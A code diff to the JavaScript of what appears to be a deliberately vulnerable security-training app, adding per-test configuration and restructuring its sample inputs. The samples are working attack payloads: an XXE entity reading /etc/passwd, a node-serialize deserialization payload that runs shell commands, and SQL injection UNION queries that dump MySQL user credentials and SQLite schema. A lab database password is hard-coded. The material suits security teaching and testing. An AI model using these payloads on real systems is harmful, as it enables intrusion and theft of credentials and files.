@@ -2,6 +2,10 @@ function addSample(sampleName) {
     $("#InputArea").val(samples[sampleName]);
 }
 
+function addConfig(sampleName) {
+    $("#HackConfig").val(config[sampleName]);
+}
+
 function showRef(testname, reftype) {
     window.open(refs[testname][reftype], `HackRefWin-${reftype}`);
 }
@@ -12,7 +16,8 @@ function runProcessor(processor) {
 
     $("#OutputArea").val("");
     let inputData = $("#InputArea").val();
-    restRunHackTool(processors[processor], inputData, function (data) {
+    let hackConfig = $("#HackConfig").val();
+    restRunHackTool(processors[processor], inputData, hackConfig, function (data) {
         if (data !== null && data !== undefined) {
             $("#OutputArea").val(JSON.stringify(data, null, indent));
         } else $("#OutputArea").val(JSON.stringify("ERROR, review logs"));
@@ -23,10 +28,14 @@ function switchTest() {
     let testname = $("#HackToolSel").val();
     console.info(`Switching test to ${testname}`);
     addSample(testname);
+    addConfig(testname);
+    $("#PrettifyLabel").prop("hidden", false);
+    $("#PrettifyOutput").prop("hidden", false);
     $("#RunHack").prop("hidden", false);
     $("#HackHelp").prop("hidden", false);
     $("#DevHelp").prop("hidden", false);
     $("#GenHelp").prop("hidden", false);
+    $("#HackConfig").prop("hidden", false);
 }
 
 function runTest() {
@@ -61,22 +70,31 @@ function showGenHelp() {
     }
 }
 
-let samples = {};
-samples.xml = `<!DOCTYPE foo [<!ELEMENT foo ANY >
+let samples = {
+    xml: `<!DOCTYPE foo [<!ELEMENT foo ANY >
     <!ENTITY bar SYSTEM "file:///etc/passwd" >]>
     <products>
     <product> <name>PS3</name> <description>&bar;</description> </product>
     <product> <name>PS4</name> <description>Gaming Console</description> </product>
-    </products>`;
-samples.json = `{"msg":"See server log for RCE :-)","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}`;
-samples.mysql = `SELECT table_schema,table_name,table_type FROM information_schema.tables UNION SELECT host,user,password from mysql.user;`;
-samples.sqlite = `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1\nUNION select "SQLITE_VERSION", sqlite_version(),"",""\nUNION select "SQLITE_DATE", datetime('now','localtime'),"",""\nUNION select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table" ;\n\npragma module_list;\npragma database_list;\npragma function_list;\n`;
+    </products>`,
+    json: `{"msg":"See server log for RCE :-)","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
+    mysql: `SELECT table_schema,table_name,table_type FROM information_schema.tables UNION SELECT host,user,password from mysql.user;`,
+    sqlite: `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1\nUNION select "SQLITE_VERSION", sqlite_version(),"",""\nUNION select "SQLITE_DATE", datetime('now','localtime'),"",""\nUNION select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table" ;\n\npragma module_list;\npragma database_list;\npragma function_list;\n`,
+};
 
-let processors = {};
-processors.xml = "xmlparser";
-processors.json = "jsonparser";
-processors.mysql = "mysql";
-processors.sqlite = "sqlite";
+let config = {
+    xml: `noent=true&noblanks=true`,
+    json: ``,
+    mysql: `host=localhost&user=tester&database=mysql&password=Passw0rd123`,
+    sqlite: `dbFile=/app/utils/chinook.db`,
+};
+
+let processors = {
+    xml: "xmlparser",
+    json: "jsonparser",
+    mysql: "mysql",
+    sqlite: "sqlite",
+};
 
 let refs = {
     xml: {
